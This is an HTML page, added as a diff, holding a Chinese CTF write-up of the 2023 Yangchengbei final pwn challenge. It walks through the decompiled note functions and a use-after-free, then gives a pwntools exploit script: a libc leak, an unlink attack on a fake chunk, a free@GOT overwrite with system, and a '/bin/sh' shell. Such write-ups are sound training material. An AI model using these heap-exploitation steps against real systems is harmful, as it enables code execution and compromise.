@@ -1,0 +1,205 @@
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>[羊城杯 2023 决赛]Printf but not fmtstr</title>
+</head>
+<body>
+<b>[羊城杯 2023 决赛]Printf but not fmtstr</b><br>
+<small>2025-04-21</small>
+<hr>
+<p>题目glibc2.36 高版本带safe-linking 推断要泄露heap_base </p>
+<pre><code>[*] &#x27;/home/rick/Downloads/attachment/pwn&#x27;
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x3fe000)</code></pre>
+
+<p>64位 部分aslr 没有pie</p>
+<pre><code>FILE *sub_40127C()
+&#123;
+  FILE *result; // rax
+
+  if ( *(FILE **)off_404070 != stderr
+    || *(FILE **)off_404078 != stdout
+    || (result = stdin, *(FILE **)off_404080 != stdin) )
+  &#123;
+    write(2, &quot;No! you can&#x27;t do this!&quot;, 0x17uLL);
+    _exit(0);
+  &#125;
+  return result;</code></pre>
+
+<p>有一个验证函数 检测是否修改了</p>
+<p>0x404070 -&gt; stderr</p>
+<p>0x404078 -&gt; stdout</p>
+<p>0x404080 -&gt; stdin </p>
+<p>这三个地址存放的这三个流的地址</p>
+<pre><code>unsigned __int64 __fastcall add_notes(const char *a1)
+&#123;
+  unsigned int v1; // ebx
+  unsigned int v3; // [rsp+0h] [rbp-20h] BYREF
+  _DWORD size[5]; // [rsp+4h] [rbp-1Ch] BYREF
+
+  *(_QWORD *)&amp;size[1] = __readfsqword(0x28u);
+  printf(&quot;Index: &quot;);
+  __isoc99_scanf(&quot;%u&quot;, &amp;v3);
+  if ( v3 &lt;= 0xF )                              // 最大只能存16个chunk
+  &#123;
+    printf(&quot;Size: &quot;);
+    __isoc99_scanf(&quot;%u&quot;, size);
+    if ( size[0] &lt;= 0x900u )
+    &#123;
+      // 0x4FF&lt;size&lt;=0x900
+      if ( size[0] &gt; 0x4FFu )
+      &#123;
+        v1 = v3;
+        qword_4040E0[v1] = malloc(size[0]);
+        dword_404160[v3] = size[0];
+      &#125;
+      else
+      &#123;
+        puts(&quot;Too small.&quot;);
+      &#125;
+    &#125;
+    else
+    &#123;
+      puts(&quot;Too big.&quot;);
+    &#125;
+  &#125;
+  else
+  &#123;
+    puts(&quot;There are only 16 pages in this notebook.&quot;);
+  &#125;
+  return *(_QWORD *)&amp;size[1] - __readfsqword(0x28u);
+&#125;</code></pre>
+
+<p>只能存16个chunk</p>
+<p>最大0x900 最小0x4FF</p>
+<p>0x4040e0存的chunk地址</p>
+<p>0x404160存的chunk的size</p>
+<pre><code>unsigned __int64 __fastcall delete_notes(const char *a1)
+&#123;
+  unsigned int v2; // [rsp+4h] [rbp-Ch] BYREF
+  unsigned __int64 v3; // [rsp+8h] [rbp-8h]
+
+  v3 = __readfsqword(0x28u);
+  printf(&quot;Index: &quot;);
+  __isoc99_scanf(&quot;%u&quot;, &amp;v2);
+  if ( v2 &lt;= 0xF )
+  &#123;
+    if ( qword_4040E0[v2] )
+      free((void *)qword_4040E0[v2]);
+    else
+      puts(&quot;Page not found.&quot;);
+  &#125;
+  else
+  &#123;
+    puts(&quot;There are only 16 pages in this notebook.&quot;);
+  &#125;
+  return v3 - __readfsqword(0x28u);
+&#125;</code></pre>
+
+<p>UAF 没有给指针置0</p>
+<pre><code>unsigned __int64 __fastcall edit_notes(const char *a1)
+&#123;
+  unsigned int v2; // [rsp+4h] [rbp-Ch] BYREF
+  unsigned __int64 v3; // [rsp+8h] [rbp-8h]
+
+  v3 = __readfsqword(0x28u);
+  printf(&quot;Index: &quot;);
+  __isoc99_scanf(&quot;%u&quot;, &amp;v2);
+  if ( v2 &lt;= 0xF )
+  &#123;
+    if ( qword_4040E0[v2] )
+    &#123;
+      printf(&quot;Content: &quot;);
+      read(0, (void *)qword_4040E0[v2], (unsigned int)dword_404160[v2]);
+    &#125;
+    else
+    &#123;
+      puts(&quot;Page not found.&quot;);
+    &#125;
+  &#125;
+  else
+  &#123;
+    puts(&quot;There are only 16 pages in this notebook.&quot;);
+  &#125;
+  return v3 - __readfsqword(0x28u);
+&#125;</code></pre>
+
+<p>用的是0x404160的size来填 如果改了这个size是不是可以溢出</p>
+<pre><code>unsigned __int64 show_notes()
+&#123;
+  unsigned int v1; // [rsp+4h] [rbp-Ch] BYREF
+  unsigned __int64 v2; // [rsp+8h] [rbp-8h]
+
+  v2 = __readfsqword(0x28u);
+  printf(&quot;Index: &quot;);
+  __isoc99_scanf(&quot;%u&quot;, &amp;v1);
+  if ( v1 &lt;= 0xF )
+  &#123;
+    if ( qword_4040E0[v1] )
+      printf(&quot;Content: %s\n&quot;, (const char *)qword_4040E0[v1]);
+    else
+      puts(&quot;Page not found.&quot;);
+  &#125;
+  else
+  &#123;
+    puts(&quot;There are only 16 pages in this notebook.&quot;);
+  &#125;
+  return v2 - __readfsqword(0x28u);
+&#125;</code></pre>
+
+<p>正常的show函数</p>
+<p>因为最小的chunk都大于0x410了 所以tcache肯定进不去了</p>
+<p>safe-linking只在tache</p>
+<p>接收:u64(p.recv(5).ljust(8,b’\x00’)) &lt;&lt; 12<br>而修改heap的fd指针:(heap_addr &gt;&gt; 12)^target_addr</p>
+<pre><code>new(0,0x500)
+new(1,0x500)
+new(2,0x500)
+new(3,0x500)
+
+delete(0)##隔着放 要不然容易触发合并
+delete(2)
+
+show(0)
+ru(b&quot;Content: &quot;)
+leak_main_arena = u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))
+ls(&quot;get_decrypted_main_arena=&gt;&quot;+hex(leak_main_arena))
+libc_base = leak_main_arena -libc.sym[&quot;_IO_2_1_stdin_&quot;] - 0x200 -64
+ls(&quot;get libc_base=&gt;&quot;+hex(libc_base))
+&#x27;&#x27;&#x27;
+pwndbg&gt; x/40gx 0x718b2d7f6cc0 -0x200
+0x718b2d7f6ac0 &lt;_IO_2_1_stdin_+64&gt;:	0x0000718b2d7f6b04	0x0000000000000000
+
+&#x27;&#x27;&#x27;</code></pre>
+
+<p>随便找的偏移 拿到libc_base</p>
+<blockquote>
+<p>[+] get_main_arena&#x3D;&gt;0x774ab4ff6cc0<br>[+] get libc_base&#x3D;&gt;0x774ab4e00000</p>
+</blockquote>
+<p>构造假chunk打unlink</p>
+<pre><code>delete(3)#触发合并 
+new(5,0x600)#recovery idx 0 
+new(6,0x610)#cut chunk set idx 4 prev_size == 0x600
+save_heap_addr = 0x4040e0
+has_bk = save_heap_addr
+has_fd = save_heap_addr +0x8
+payload = p64(0)+p64(0x601)+p64(has_bk)+p64(has_fd)
+edit(3,payload)#现在可以发现块有了PREV_INUSE + FD BK改变 + next_chunk的prev_size 符合我们构造的fake_chunk
+delete(4)
+ogg = libc_base +0x4e1c9
+edit(3,p64(e.got[&quot;free&quot;]))
+edit(0,p64(libc_base+libc.sym[&quot;system&quot;]))
+edit(2,b&#x27;/bin/sh\x00&#x27;)
+delete(2)
+#sla(b&quot;&gt;&quot;,str(1))
+
+#attach(io)</code></pre>
+
+<p>打完后才发现有后门，，</p>
+
+<hr>
+<a href="index.html">返回首页</a> | <a href="../">返回主站</a>
+</body>
+</html>
